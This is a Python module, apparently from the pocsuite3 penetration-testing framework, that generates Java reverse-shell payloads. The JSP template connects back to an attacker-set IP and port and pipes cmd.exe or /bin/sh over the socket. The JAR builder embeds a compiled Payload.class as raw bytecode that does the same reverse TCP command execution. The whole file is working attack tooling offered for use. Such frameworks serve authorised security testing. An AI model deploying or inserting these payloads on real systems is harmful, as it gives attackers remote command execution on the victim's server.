import os
from .base import ShellCode
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.helper.archieve.jar import Jar
from pocsuite3.lib.core.enums import SHELLCODE_TYPE


class JavaShellCode(ShellCode):
    """
        Class with shellcodes for java language
    """
    def __init__(self, connect_back_ip='localhost', connect_back_port=5555,
                 bad_chars=['\x00'], shell_type=SHELLCODE_TYPE.JAR, make_jar=False):
        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port,
                           bad_chars=bad_chars)
        self.shell_type = shell_type
        self.make_jar = make_jar
        self.path_to_jar = ""

    def get_jsp(self, inline=False):
        """ Function to get java(jsp) shellcode """

        if not self.connect_back_ip or not self.connect_back_port:
            print("Settings for connectback listener must be defined")
            return False

        java_code = """
            <%@page import="java.lang.*, java.util.*, java.io.*, java.net.*"%>
            <%class StreamConnector extends Thread {
                InputStream is;
                OutputStream os;
                StreamConnector( InputStream is, OutputStream os ) {
                    this.is = is;
                    this.os = os;
                }
                public void run() {
                    BufferedReader in = null;
                    BufferedWriter out = null;
                    try {
                        in = new BufferedReader( new InputStreamReader( this.is ) );
                        out = new BufferedWriter( new OutputStreamWriter( this.os ) );
                        char buffer[] = new char[8192];
                        int length;
                        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) {
                            out.write( buffer, 0, length ); out.flush();
                        }
                    } catch( Exception e ){
                    }
                    try {
                        if( in != null ) in.close();
                        if( out != null ) out.close();
                    } catch( Exception e ){}
                }
            }
            try {
                String OS = System.getProperty("os.name").toLowerCase();
                Socket socket = new Socket( "{{LOCALHOST}}", {{LOCALPORT}} );
                String command = "cmd.exe";
                if (OS.indexOf("win") < 0)
                    command = "/bin/sh";
                Process process = Runtime.getRuntime().exec(command);
                (new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();
                (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
            } catch( Exception e ) {
            }
            %>
        """
        java_code = self.format_shellcode(java_code)
        if inline:
            java_code = self.make_inline(java_code)
        return java_code

    def get_jar(self, filename=""):
        filepath = os.path.join(paths.POCSUITE_TMP_PATH, "payload.jar")
        jar = Jar(filepath)
        data = "{host};{port}".format(host=self.connect_back_ip, port=self.connect_back_port)
        jar.add_file('east/data.dat', data)
        java_reverse_tcp = (
            b'\xca\xfe\xba\xbe\x00\x00\x00\x33\x00\xc4\x0a\x00\x3c\x00\x5c\x08'
            b'\x00\x5d\x0a\x00\x2b\x00\x5e\x0a\x00\x5f\x00\x60\x07\x00\x61\x0a'
            b'\x00\x05\x00\x62\x07\x00\x63\x07\x00\x64\x0a\x00\x05\x00\x65\x0a'
            b'\x00\x08\x00\x66\x0a\x00\x07\x00\x67\x07\x00\x68\x0a\x00\x05\x00'
            b'\x69\x0a\x00\x0c\x00\x6a\x0a\x00\x07\x00\x6b\x08\x00\x6c\x0a\x00'
            b'\x13\x00\x6d\x0a\x00\x2b\x00\x6e\x07\x00\x6f\x08\x00\x70\x08\x00'
            b'\x71\x0a\x00\x2b\x00\x72\x08\x00\x73\x0a\x00\x13\x00\x74\x0a\x00'
            b'\x0c\x00\x75\x0a\x00\x05\x00\x76\x07\x00\x77\x0a\x00\x1b\x00\x5c'
            b'\x0a\x00\x78\x00\x79\x0a\x00\x78\x00\x7a\x0a\x00\x7b\x00\x7c\x0a'
            b'\x00\x7b\x00\x65\x08\x00\x7d\x07\x00\x7e\x0a\x00\x22\x00\x5c\x0a'
            b'\x00\x22\x00\x7f\x08\x00\x80\x0a\x00\x22\x00\x81\x0a\x00\x1b\x00'
            b'\x82\x07\x00\x83\x0a\x00\x28\x00\x84\x0a\x00\x1b\x00\x81\x07\x00'
            b'\x85\x0a\x00\x86\x00\x87\x0a\x00\x07\x00\x76\x07\x00\x88\x09\x00'
            b'\x89\x00\x8a\x0a\x00\x2e\x00\x81\x0a\x00\x8b\x00\x75\x08\x00\x8c'
            b'\x09\x00\x2b\x00\x8d\x08\x00\x8e\x0a\x00\x13\x00\x8f\x08\x00\x90'
            b'\x08\x00\x91\x08\x00\x92\x08\x00\x93\x0a\x00\x89\x00\x94\x0a\x00'
            b'\x13\x00\x95\x07\x00\x96\x01\x00\x02\x4f\x53\x01\x00\x12\x4c\x6a'
            b'\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b'
            b'\x01\x00\x06\x3c\x69\x6e\x69\x74\x3e\x01\x00\x03\x28\x29\x56\x01'
            b'\x00\x04\x43\x6f\x64\x65\x01\x00\x0f\x4c\x69\x6e\x65\x4e\x75\x6d'
            b'\x62\x65\x72\x54\x61\x62\x6c\x65\x01\x00\x04\x6d\x61\x69\x6e\x01'
            b'\x00\x16\x28\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53'
            b'\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x0d\x53\x74\x61\x63\x6b'
            b'\x4d\x61\x70\x54\x61\x62\x6c\x65\x07\x00\x97\x07\x00\x6f\x07\x00'
            b'\x61\x07\x00\x63\x07\x00\x68\x01\x00\x0a\x45\x78\x63\x65\x70\x74'
            b'\x69\x6f\x6e\x73\x01\x00\x0e\x65\x78\x65\x63\x75\x74\x65\x43\x6f'
            b'\x6d\x6d\x61\x6e\x64\x01\x00\x27\x28\x5b\x4c\x6a\x61\x76\x61\x2f'
            b'\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61'
            b'\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x07'
            b'\x00\x77\x07\x00\x98\x07\x00\x83\x01\x00\x10\x70\x61\x72\x73\x65'
            b'\x46\x69\x6c\x65\x43\x6f\x6e\x74\x65\x6e\x74\x01\x00\x27\x28\x4c'
            b'\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67'
            b'\x3b\x29\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74'
            b'\x72\x69\x6e\x67\x3b\x07\x00\x99\x07\x00\x7e\x07\x00\x88\x01\x00'
            b'\x09\x69\x73\x57\x69\x6e\x64\x6f\x77\x73\x01\x00\x03\x28\x29\x5a'
            b'\x01\x00\x06\x69\x73\x55\x6e\x69\x78\x01\x00\x08\x3c\x63\x6c\x69'
            b'\x6e\x69\x74\x3e\x01\x00\x0a\x53\x6f\x75\x72\x63\x65\x46\x69\x6c'
            b'\x65\x01\x00\x0c\x50\x61\x79\x6c\x6f\x61\x64\x2e\x6a\x61\x76\x61'
            b'\x0c\x00\x3f\x00\x40\x01\x00\x08\x64\x61\x74\x61\x2e\x64\x61\x74'
            b'\x0c\x00\x51\x00\x52\x07\x00\x9a\x0c\x00\x9b\x00\x9c\x01\x00\x0f'
            b'\x6a\x61\x76\x61\x2f\x6e\x65\x74\x2f\x53\x6f\x63\x6b\x65\x74\x0c'
            b'\x00\x3f\x00\x9d\x01\x00\x16\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x42'
            b'\x75\x66\x66\x65\x72\x65\x64\x52\x65\x61\x64\x65\x72\x01\x00\x19'
            b'\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72'
            b'\x65\x61\x6d\x52\x65\x61\x64\x65\x72\x0c\x00\x9e\x00\x9f\x0c\x00'
            b'\x3f\x00\xa0\x0c\x00\x3f\x00\xa1\x01\x00\x13\x6a\x61\x76\x61\x2f'
            b'\x69\x6f\x2f\x50\x72\x69\x6e\x74\x57\x72\x69\x74\x65\x72\x0c\x00'
            b'\xa2\x00\xa3\x0c\x00\x3f\x00\xa4\x0c\x00\xa5\x00\xa6\x01\x00\x04'
            b'\x65\x78\x69\x74\x0c\x00\xa7\x00\xa8\x0c\x00\x56\x00\x57\x01\x00'
            b'\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e'
            b'\x67\x01\x00\x07\x63\x6d\x64\x2e\x65\x78\x65\x01\x00\x02\x2f\x43'
            b'\x0c\x00\x4c\x00\x4d\x01\x00\x01\x20\x0c\x00\xa9\x00\x52\x0c\x00'
            b'\xaa\x00\xab\x0c\x00\xac\x00\x40\x01\x00\x16\x6a\x61\x76\x61\x2f'
            b'\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x42\x75\x66\x66\x65'
            b'\x72\x07\x00\xad\x0c\x00\xae\x00\xaf\x0c\x00\xb0\x00\xb1\x07\x00'
            b'\x98\x0c\x00\xb2\x00\xb3\x01\x00\x00\x01\x00\x17\x6a\x61\x76\x61'
            b'\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x42\x75\x69\x6c'
            b'\x64\x65\x72\x0c\x00\xb4\x00\xb5\x01\x00\x01\x0a\x0c\x00\xb6\x00'
            b'\xa6\x0c\x00\xb4\x00\xb7\x01\x00\x13\x6a\x61\x76\x61\x2f\x6c\x61'
            b'\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x0c\x00\xb8\x00'
            b'\x40\x01\x00\x0c\x65\x61\x73\x74\x2f\x50\x61\x79\x6c\x6f\x61\x64'
            b'\x07\x00\xb9\x0c\x00\xba\x00\xbb\x01\x00\x13\x6a\x61\x76\x61\x2f'
            b'\x69\x6f\x2f\x49\x4f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x07\x00'
            b'\xbc\x0c\x00\xbd\x00\xbe\x07\x00\xbf\x01\x00\x01\x3b\x0c\x00\x3d'
            b'\x00\x3e\x01\x00\x03\x77\x69\x6e\x0c\x00\xc0\x00\x9c\x01\x00\x03'
            b'\x6e\x69\x78\x01\x00\x03\x6e\x75\x78\x01\x00\x03\x61\x69\x78\x01'
            b'\x00\x07\x6f\x73\x2e\x6e\x61\x6d\x65\x0c\x00\xc1\x00\xc2\x0c\x00'
            b'\xc3\x00\xa6\x01\x00\x15\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f'
            b'\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x01\x00\x13\x5b\x4c'
            b'\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67'
            b'\x3b\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x50\x72'
            b'\x6f\x63\x65\x73\x73\x01\x00\x13\x6a\x61\x76\x61\x2f\x69\x6f\x2f'
            b'\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x11\x6a\x61'
            b'\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x49\x6e\x74\x65\x67\x65\x72\x01'
            b'\x00\x08\x70\x61\x72\x73\x65\x49\x6e\x74\x01\x00\x15\x28\x4c\x6a'
            b'\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b'
            b'\x29\x49\x01\x00\x16\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67'
            b'\x2f\x53\x74\x72\x69\x6e\x67\x3b\x49\x29\x56\x01\x00\x0e\x67\x65'
            b'\x74\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x17\x28'
            b'\x29\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53'
            b'\x74\x72\x65\x61\x6d\x3b\x01\x00\x18\x28\x4c\x6a\x61\x76\x61\x2f'
            b'\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x29'
            b'\x56\x01\x00\x13\x28\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x52\x65'
            b'\x61\x64\x65\x72\x3b\x29\x56\x01\x00\x0f\x67\x65\x74\x4f\x75\x74'
            b'\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x18\x28\x29\x4c\x6a'
            b'\x61\x76\x61\x2f\x69\x6f\x2f\x4f\x75\x74\x70\x75\x74\x53\x74\x72'
            b'\x65\x61\x6d\x3b\x01\x00\x1a\x28\x4c\x6a\x61\x76\x61\x2f\x69\x6f'
            b'\x2f\x4f\x75\x74\x70\x75\x74\x53\x74\x72\x65\x61\x6d\x3b\x5a\x29'
            b'\x56\x01\x00\x08\x72\x65\x61\x64\x4c\x69\x6e\x65\x01\x00\x14\x28'
            b'\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69'
            b'\x6e\x67\x3b\x01\x00\x10\x65\x71\x75\x61\x6c\x73\x49\x67\x6e\x6f'
            b'\x72\x65\x43\x61\x73\x65\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f'
            b'\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x5a\x01\x00'
            b'\x05\x73\x70\x6c\x69\x74\x01\x00\x07\x70\x72\x69\x6e\x74\x6c\x6e'
            b'\x01\x00\x15\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53'
            b'\x74\x72\x69\x6e\x67\x3b\x29\x56\x01\x00\x05\x63\x6c\x6f\x73\x65'
            b'\x01\x00\x11\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x52\x75\x6e'
            b'\x74\x69\x6d\x65\x01\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d'
            b'\x65\x01\x00\x15\x28\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67'
            b'\x2f\x52\x75\x6e\x74\x69\x6d\x65\x3b\x01\x00\x04\x65\x78\x65\x63'
            b'\x01\x00\x28\x28\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f'
            b'\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61'
            b'\x6e\x67\x2f\x50\x72\x6f\x63\x65\x73\x73\x3b\x01\x00\x07\x77\x61'
            b'\x69\x74\x46\x6f\x72\x01\x00\x03\x28\x29\x49\x01\x00\x06\x61\x70'
            b'\x70\x65\x6e\x64\x01\x00\x2d\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61'
            b'\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61'
            b'\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x42\x75\x69\x6c'
            b'\x64\x65\x72\x3b\x01\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x01'
            b'\x00\x2c\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74'
            b'\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67'
            b'\x2f\x53\x74\x72\x69\x6e\x67\x42\x75\x66\x66\x65\x72\x3b\x01\x00'
            b'\x0f\x70\x72\x69\x6e\x74\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65'
            b'\x01\x00\x0f\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61'
            b'\x73\x73\x01\x00\x13\x67\x65\x74\x52\x65\x73\x6f\x75\x72\x63\x65'
            b'\x41\x73\x53\x74\x72\x65\x61\x6d\x01\x00\x29\x28\x4c\x6a\x61\x76'
            b'\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c'
            b'\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x49\x6e\x70\x75\x74\x53\x74\x72'
            b'\x65\x61\x6d\x3b\x01\x00\x10\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67'
            b'\x2f\x53\x79\x73\x74\x65\x6d\x01\x00\x03\x6f\x75\x74\x01\x00\x15'
            b'\x4c\x6a\x61\x76\x61\x2f\x69\x6f\x2f\x50\x72\x69\x6e\x74\x53\x74'
            b'\x72\x65\x61\x6d\x3b\x01\x00\x13\x6a\x61\x76\x61\x2f\x69\x6f\x2f'
            b'\x50\x72\x69\x6e\x74\x53\x74\x72\x65\x61\x6d\x01\x00\x07\x69\x6e'
            b'\x64\x65\x78\x4f\x66\x01\x00\x0b\x67\x65\x74\x50\x72\x6f\x70\x65'
            b'\x72\x74\x79\x01\x00\x26\x28\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e'
            b'\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x29\x4c\x6a\x61\x76\x61\x2f'
            b'\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x01\x00\x0b\x74'
            b'\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65\x00\x21\x00\x2b\x00\x3c'
            b'\x00\x00\x00\x01\x00\x0a\x00\x3d\x00\x3e\x00\x00\x00\x07\x00\x01'
            b'\x00\x3f\x00\x40\x00\x01\x00\x41\x00\x00\x00\x1d\x00\x01\x00\x01'
            b'\x00\x00\x00\x05\x2a\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x42\x00'
            b'\x00\x00\x06\x00\x01\x00\x00\x00\x06\x00\x09\x00\x43\x00\x44\x00'
            b'\x02\x00\x41\x00\x00\x01\x24\x00\x05\x00\x09\x00\x00\x00\x91\x12'
            b'\x02\xb8\x00\x03\x4c\x2b\x03\x32\x4d\x2b\x04\x32\xb8\x00\x04\x3e'
            b'\xbb\x00\x05\x59\x2c\x1d\xb7\x00\x06\x3a\x04\xbb\x00\x07\x59\xbb'
            b'\x00\x08\x59\x19\x04\xb6\x00\x09\xb7\x00\x0a\xb7\x00\x0b\x3a\x05'
            b'\xbb\x00\x0c\x59\x19\x04\xb6\x00\x0d\x04\xb7\x00\x0e\x3a\x06\x19'
            b'\x05\xb6\x00\x0f\x3a\x07\x19\x07\x12\x10\xb6\x00\x11\x99\x00\x06'
            b'\xa7\x00\x3a\xb8\x00\x12\x99\x00\x1e\x06\xbd\x00\x13\x59\x03\x12'
            b'\x14\x53\x59\x04\x12\x15\x53\x59\x05\x19\x07\x53\xb8\x00\x16\x3a'
            b'\x08\xa7\x00\x0f\x19\x07\x12\x17\xb6\x00\x18\xb8\x00\x16\x3a\x08'
            b'\x19\x06\x19\x08\xb6\x00\x19\xa7\xff\x94\x19\x04\xb6\x00\x1a\xb1'
            b'\x00\x00\x00\x02\x00\x42\x00\x00\x00\x3e\x00\x0f\x00\x00\x00\x0a'
            b'\x00\x06\x00\x0b\x00\x0a\x00\x0c\x00\x11\x00\x0d\x00\x1c\x00\x10'
            b'\x00\x31\x00\x11\x00\x40\x00\x12\x00\x47\x00\x14\x00\x54\x00\x16'
            b'\x00\x5a\x00\x17\x00\x75\x00\x1b\x00\x81\x00\x1d\x00\x88\x00\x1e'
            b'\x00\x8b\x00\x1f\x00\x90\x00\x20\x00\x45\x00\x00\x00\x3d\x00\x05'
            b'\xff\x00\x1c\x00\x05\x07\x00\x46\x07\x00\x46\x07\x00\x47\x01\x07'
            b'\x00\x48\x00\x00\xfe\x00\x37\x07\x00\x49\x07\x00\x4a\x07\x00\x47'
            b'\x20\xfc\x00\x0b\x07\x00\x47\xff\x00\x09\x00\x05\x07\x00\x46\x07'
            b'\x00\x46\x07\x00\x47\x01\x07\x00\x48\x00\x00\x00\x4b\x00\x00\x00'
            b'\x04\x00\x01\x00\x2e\x00\x09\x00\x4c\x00\x4d\x00\x01\x00\x41\x00'
            b'\x00\x00\xd9\x00\x05\x00\x05\x00\x00\x00\x5f\xbb\x00\x1b\x59\xb7'
            b'\x00\x1c\x4c\xb8\x00\x1d\x2a\xb6\x00\x1e\x4d\x2c\xb6\x00\x1f\x57'
            b'\xbb\x00\x07\x59\xbb\x00\x08\x59\x2c\xb6\x00\x20\xb7\x00\x0a\xb7'
            b'\x00\x0b\x4e\x12\x21\x3a\x04\x2d\xb6\x00\x0f\x59\x3a\x04\xc6\x00'
            b'\x1f\x2b\xbb\x00\x22\x59\xb7\x00\x23\x19\x04\xb6\x00\x24\x12\x25'
            b'\xb6\x00\x24\xb6\x00\x26\xb6\x00\x27\x57\xa7\xff\xdd\xa7\x00\x08'
            b'\x4e\x2d\xb6\x00\x29\x2b\xb6\x00\x2a\xb0\x00\x01\x00\x08\x00\x52'
            b'\x00\x55\x00\x28\x00\x02\x00\x42\x00\x00\x00\x2e\x00\x0b\x00\x00'
            b'\x00\x24\x00\x08\x00\x27\x00\x10\x00\x28\x00\x15\x00\x29\x00\x28'
            b'\x00\x2c\x00\x2c\x00\x2d\x00\x36\x00\x2e\x00\x52\x00\x33\x00\x55'
            b'\x00\x31\x00\x56\x00\x32\x00\x5a\x00\x34\x00\x45\x00\x00\x00\x2c'
            b'\x00\x04\xff\x00\x2c\x00\x05\x07\x00\x46\x07\x00\x4e\x07\x00\x4f'
            b'\x07\x00\x49\x07\x00\x47\x00\x00\xf9\x00\x25\xff\x00\x02\x00\x02'
            b'\x07\x00\x46\x07\x00\x4e\x00\x01\x07\x00\x50\x04\x00\x09\x00\x51'
            b'\x00\x52\x00\x01\x00\x41\x00\x00\x00\xd9\x00\x05\x00\x06\x00\x00'
            b'\x00\x5c\x13\x00\x2b\x2a\xb6\x00\x2c\x4c\xbb\x00\x07\x59\xbb\x00'
            b'\x08\x59\x2b\xb7\x00\x0a\xb7\x00\x0b\x4d\xbb\x00\x22\x59\xb7\x00'
            b'\x23\x4e\x2c\xb6\x00\x0f\x59\x3a\x04\xc6\x00\x0d\x2d\x19\x04\xb6'
            b'\x00\x24\x57\xa7\xff\xef\x2d\xb6\x00\x26\x3a\x05\x2c\xb6\x00\x2d'
            b'\xa7\x00\x10\x3a\x05\xb2\x00\x2f\x19\x05\xb6\x00\x30\xb6\x00\x31'
            b'\x2d\xb6\x00\x26\x3a\x05\x19\x05\x12\x32\xb6\x00\x18\xb0\x00\x01'
            b'\x00\x20\x00\x3e\x00\x41\x00\x2e\x00\x02\x00\x42\x00\x00\x00\x32'
            b'\x00\x0c\x00\x00\x00\x39\x00\x08\x00\x3a\x00\x18\x00\x3b\x00\x20'
            b'\x00\x3e\x00\x2a\x00\x3f\x00\x34\x00\x42\x00\x3a\x00\x43\x00\x3e'
            b'\x00\x46\x00\x41\x00\x44\x00\x43\x00\x45\x00\x4e\x00\x47\x00\x54'
            b'\x00\x48\x00\x45\x00\x00\x00\x2b\x00\x04\xfe\x00\x20\x07\x00\x53'
            b'\x07\x00\x49\x07\x00\x54\xfc\x00\x13\x07\x00\x47\xff\x00\x0c\x00'
            b'\x04\x07\x00\x47\x07\x00\x53\x07\x00\x49\x07\x00\x54\x00\x01\x07'
            b'\x00\x55\x0c\x00\x09\x00\x56\x00\x57\x00\x01\x00\x41\x00\x00\x00'
            b'\x34\x00\x02\x00\x00\x00\x00\x00\x11\xb2\x00\x33\x12\x34\xb6\x00'
            b'\x35\x9b\x00\x07\x04\xa7\x00\x04\x03\xac\x00\x00\x00\x02\x00\x42'
            b'\x00\x00\x00\x06\x00\x01\x00\x00\x00\x4d\x00\x45\x00\x00\x00\x05'
            b'\x00\x02\x0f\x40\x01\x00\x09\x00\x58\x00\x57\x00\x01\x00\x41\x00'
            b'\x00\x00\x4b\x00\x02\x00\x00\x00\x00\x00\x27\xb2\x00\x33\x12\x36'
            b'\xb6\x00\x35\x9c\x00\x19\xb2\x00\x33\x12\x37\xb6\x00\x35\x9c\x00'
            b'\x0e\xb2\x00\x33\x12\x38\xb6\x00\x35\x9e\x00\x07\x04\xa7\x00\x04'
            b'\x03\xac\x00\x00\x00\x02\x00\x42\x00\x00\x00\x06\x00\x01\x00\x00'
            b'\x00\x51\x00\x45\x00\x00\x00\x06\x00\x03\x21\x03\x40\x01\x00\x08'
            b'\x00\x59\x00\x40\x00\x01\x00\x41\x00\x00\x00\x24\x00\x01\x00\x00'
            b'\x00\x00\x00\x0c\x12\x39\xb8\x00\x3a\xb6\x00\x3b\xb3\x00\x33\xb1'
            b'\x00\x00\x00\x01\x00\x42\x00\x00\x00\x06\x00\x01\x00\x00\x00\x07'
            b'\x00\x01\x00\x5a\x00\x00\x00\x02\x00\x5b'
        )
        jar.add_file('east/Payload.class', java_reverse_tcp)
        if self.make_jar:
            self.path_to_jar = filepath
        remove_jar = not self.make_jar
        return jar.get_raw(remove_jar)

    def get_shellcode(self, inline=False):
        shell = ""
        if self.shell_type == SHELLCODE_TYPE.JAR:
            shell = self.get_jar()
        elif self.shell_type == SHELLCODE_TYPE.JSP:
            shell = self.get_jsp(inline)
        return shell
